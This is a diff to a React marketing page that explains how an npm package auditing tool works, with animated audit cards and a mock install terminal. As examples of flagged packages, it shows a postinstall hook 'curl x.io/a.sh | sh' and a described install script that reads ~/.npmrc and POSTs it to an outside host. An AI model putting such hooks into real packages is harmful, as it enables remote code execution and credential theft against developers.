@@ -293,6 +293,26 @@ export function HowItWorks() {
           .to("[data-sensor-flag]", { opacity: 0, duration: 0.3 }, "-=0.45");
       }
 
+      /* ── The two early exits: the ticks that ran fill; the rest hatch ── */
+      q("[data-exit]").forEach((card) => {
+        const s2 = gsap.utils.selector(card);
+        const fills = s2("[data-tick-fill]");
+        gsap.set(fills, { scaleX: 0 });
+        gsap
+          .timeline({
+            scrollTrigger: st({ trigger: card, start: "top 82%", toggleActions: "play none none reverse" }),
+          })
+          .from(card, { opacity: 0, y: 22, duration: 0.5, ease: "power3.out" })
+          .to(fills, { scaleX: 1, duration: 0.34, stagger: 0.14, ease: "power2.out" }, "-=0.2")
+          .from(s2("[data-exit-row]"), { opacity: 0, x: -10, duration: 0.3, stagger: 0.14, ease: "power2.out" }, "-=0.35")
+          .fromTo(
+            s2("[data-stamp]"),
+            { borderWidth: 1 },
+            { borderWidth: 2, duration: 0.42, ease: "power1.inOut" },
+            "+=0.1",
+          );
+      });
+
       /* ── Act 4: the verdicts land ───────────────────────────────────── */
       q("[data-vcard]").forEach((card, i) => {
         gsap
@@ -333,7 +353,13 @@ export function HowItWorks() {
             },
           })
           .set(caret, { display: "none" })
-          .to(outs, { opacity: 1, duration: 0.24, stagger: 0.19, ease: "power2.out" }, "+=0.2");
+          .to(outs, { opacity: 1, duration: 0.24, stagger: 0.19, ease: "power2.out" }, "+=0.2")
+          .fromTo(
+            q("[data-term] [data-stamp]"),
+            { borderWidth: 1 },
+            { borderWidth: 2, duration: 0.42, ease: "power1.inOut" },
+            "-=0.55",
+          );
 
         ScrollTrigger.create(
           st({ trigger: q("[data-term]")[0], start: "top 78%", once: true, onEnter: () => tl.play(0) }),
@@ -678,22 +704,45 @@ export function HowItWorks() {
         </div>
 
         <div className="hiw-wrap">
+          <p className="hiw-eyebrow" data-fade>
+            where it usually ends
+          </p>
+          <h2 className="hiw-h2" data-split>
+            Most audits stop long before the sandbox.
+          </h2>
+
           <div className="hiw-offramps">
-            <article className="hiw-offramp" data-fade>
-              <span className="hiw-offramp__k">it can end at 01</span>
-              <p>
-                Some packages pipe a script off the internet into a shell, or run an install hook
-                for a file they never shipped. What executes isn&rsquo;t in the package, so reading
-                the package proves nothing. Dangerous on its face.
-              </p>
-            </article>
-            <article className="hiw-offramp" data-fade>
-              <span className="hiw-offramp__k">it can end at 03</span>
-              <p>
-                No file produced an accusation, so there is nothing to test. The sandbox never
-                starts. That is the ordinary outcome for almost everything.
-              </p>
-            </article>
+            <Exit
+              tone="danger"
+              pkg="sketchy-installer@0.3.1"
+              ran={1}
+              stamp="Dangerous"
+              rationale="Dealbreaker: shell-pipe — Script 'postinstall' contains shell pipe: curl x.io/a.sh | sh"
+              foot="no model was asked, no sandbox was started"
+              rows={[
+                ["01", "unpack", <>3 files · 1 install hook</>],
+                [
+                  "↳",
+                  "check",
+                  <>
+                    postinstall = <span className="hiw-bad">curl x.io/a.sh | sh</span>
+                  </>,
+                ],
+              ]}
+            />
+            <Exit
+              tone="safe"
+              pkg="chalk@5.6.2"
+              ran={3}
+              stamp="Safe"
+              rationale="No suspicions were raised."
+              foot="every file was read against the pitch; none of them accused it"
+              rows={[
+                ["01", "unpack", <>12 files · no install hook</>],
+                ["02", "pitch", <>“Terminal string styling done right”</>],
+                ["03", "suspect", <>5 files read · 0 accusations</>],
+              ]}
+            />
           </div>
         </div>
       </section>
@@ -709,20 +758,29 @@ export function HowItWorks() {
           </h2>
 
           <div className="hiw-sgrid" data-sgrid>
-            <Sensor k="the kernel" d="M0 30 H24 l4 -14 l4 22 l4 -14 H60 l5 -10 l5 18 l5 -10 H120">
+            <Sensor
+              k="the kernel"
+              d="M0 28 H14 l3 -12 l3 20 l3 -12 H38 l3 -7 l3 12 l3 -7 H56 l4 -16 l4 24 l4 -16 H82 l3 -9 l3 15 l3 -9 H104 l3 -6 l3 10 l3 -6 H120"
+            >
               Every request it makes of the operating system.
             </Sensor>
             <Sensor
               k="the runtime"
-              d="M0 22 H30 l4 -12 l4 20 l4 -12 H70 l5 -8 l5 14 l5 -8 H120"
+              d="M0 24 H18 l3 -10 l3 17 l3 -10 H44 l4 -14 l4 22 l4 -14 H72 l3 -8 l3 13 l3 -8 H96 l3 -11 l3 18 l3 -11 H120"
               blind
             >
               Inside the JavaScript engine — and it can be patched out.
             </Sensor>
-            <Sensor k="the wire" d="M0 26 H40 l4 -16 l4 26 l4 -16 H84 l4 -10 l4 18 l4 -10 H120">
+            <Sensor
+              k="the wire"
+              d="M0 26 H22 l4 -18 l4 28 l4 -18 H52 l3 -6 l3 10 l3 -6 H74 l4 -13 l4 21 l4 -13 H100 l3 -8 l3 13 l3 -8 H120"
+            >
               Raw packets leaving the box, whatever the code claims.
             </Sensor>
-            <Sensor k="the disk" d="M0 32 H50 l5 -18 l5 26 l5 -18 H120">
+            <Sensor
+              k="the disk"
+              d="M0 30 H26 l4 -17 l4 26 l4 -17 H62 l3 -5 l3 8 l3 -5 H88 l4 -12 l4 19 l4 -12 H120"
+            >
               A before-and-after photograph of the filesystem.
             </Sensor>
           </div>
@@ -807,29 +865,54 @@ export function HowItWorks() {
                 replay ↻
               </button>
             </div>
-            <pre className="hiw-term__body">
-              <code>
-                <span className="hiw-line hiw-line--cmd">
-                  <span className="hiw-prompt">$</span> <span data-cmd />
-                  <span className="hiw-caret" data-term-caret aria-hidden="true" />
-                </span>
-                <span className="hiw-line" data-term-out>
-                  {"  looking up left-pad-utils@2.0.1 …"}
-                </span>
-                <span className="hiw-line" data-term-out>
-                  {"  audit found · concluded 3 days ago"}
-                </span>
-                <span className="hiw-line hiw-line--bad" data-term-out>
-                  {"  DANGEROUS   reads ~/.npmrc on install, POSTs it to a1-metrics.io"}
-                </span>
-                <span className="hiw-line" data-term-out>
-                  {"              proof: 3 cited events in run_3c9a… · npmguard replay run_3c9a"}
-                </span>
-                <span className="hiw-line" data-term-out>
-                  {"  install blocked. re-run with --force to override."}
-                </span>
-              </code>
-            </pre>
+            <div className="hiw-term__body">
+              <p className="hiw-line hiw-line--cmd">
+                <span className="hiw-prompt">$</span> <span data-cmd />
+                <span className="hiw-caret" data-term-caret aria-hidden="true" />
+              </p>
+              <p className="hiw-line hiw-line--muted" data-term-out>
+                resolving left-pad-utils … 2.0.1
+              </p>
+              <p className="hiw-line hiw-line--muted" data-term-out>
+                audit found · concluded 3 days ago · run_3c9a
+              </p>
+
+              {/* The verdict block a real install prints. It carries the SAME
+                  event ids the hero cited, because it is the same finding
+                  arriving where it actually matters. */}
+              <div className="hiw-verdictblock" data-term-out>
+                <div className="hiw-verdictblock__head">
+                  <span className="hiw-stamp hiw-stamp--danger" data-stamp>
+                    Dangerous
+                  </span>
+                  <span>credential theft, confirmed in a sandbox run</span>
+                </div>
+                <p className="hiw-verdictblock__where">
+                  <span className="hiw-cap__tag">setup.js:14–16</span>
+                  reads ~/.npmrc during postinstall and POSTs it off-box
+                </p>
+                <div className="hiw-evlist">
+                  {HERO_EVENTS.filter((e) => e.cited).map((ev) => (
+                    <div className="hiw-ev is-cited" key={ev.id}>
+                      <span className="hiw-ev__id">{ev.id}</span>
+                      <span className="hiw-ev__tag">{ev.tag}</span>
+                      <span>{ev.what}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+
+              <p className="hiw-line hiw-line--muted" data-term-out>
+                npmguard replay run_3c9a <span className="hiw-line__aside">watch the run yourself</span>
+              </p>
+              <p className="hiw-line" data-term-out>
+                <span className="hiw-prompt">?</span> install anyway ·{" "}
+                <span className="hiw-line--bad">no</span>
+              </p>
+              <p className="hiw-line hiw-line--bad" data-term-out>
+                ✗ install blocked
+              </p>
+            </div>
           </div>
 
           <div className="hiw-cta" data-fade>
@@ -870,6 +953,66 @@ function Station({
         <p>{body}</p>
       </div>
       {children}
+    </article>
+  );
+}
+
+/** One early exit, drawn as the audit card it actually is: the steps that ran,
+ *  the verdict, and a six-tick strip whose remaining ticks are hatched — the
+ *  same "no signal here" texture the app uses for an unevaluated state. Prose
+ *  can say "it stops at step one"; this shows the five steps that never ran. */
+function Exit({
+  tone,
+  pkg,
+  ran,
+  rows,
+  stamp,
+  rationale,
+  foot,
+}: {
+  tone: "danger" | "safe";
+  pkg: string;
+  ran: number;
+  rows: [string, string, React.ReactNode][];
+  stamp: string;
+  rationale: string;
+  foot: string;
+}) {
+  return (
+    <article className={`hiw-exit hiw-exit--${tone}`} data-exit>
+      <header className="hiw-exit__bar">
+        <span className="hiw-dot" aria-hidden="true" />
+        audit · {pkg}
+      </header>
+
+      <div className="hiw-ticks" aria-hidden="true">
+        {[0, 1, 2, 3, 4, 5].map((i) => (
+          <span className={i < ran ? "hiw-tick hiw-tick--ran" : "hiw-tick"} key={i}>
+            {i < ran ? <i className="hiw-tick__fill" data-tick-fill /> : null}
+          </span>
+        ))}
+      </div>
+      <p className="hiw-ticks__k">
+        {ran} of 6 steps ran · {6 - ran} never started
+      </p>
+
+      <div className="hiw-exit__rows">
+        {rows.map(([n, k, what], i) => (
+          <div className="hiw-exit__row" data-exit-row key={i}>
+            <span className="hiw-exit__n">{n}</span>
+            <span className="hiw-exit__k">{k}</span>
+            <span>{what}</span>
+          </div>
+        ))}
+      </div>
+
+      <div className="hiw-exit__verdict">
+        <span className={`hiw-stamp hiw-stamp--${tone}`} data-stamp>
+          {stamp}
+        </span>
+        <p className="hiw-exit__rationale">{rationale}</p>
+      </div>
+      <p className="hiw-exit__foot">{foot}</p>
     </article>
   );
 }
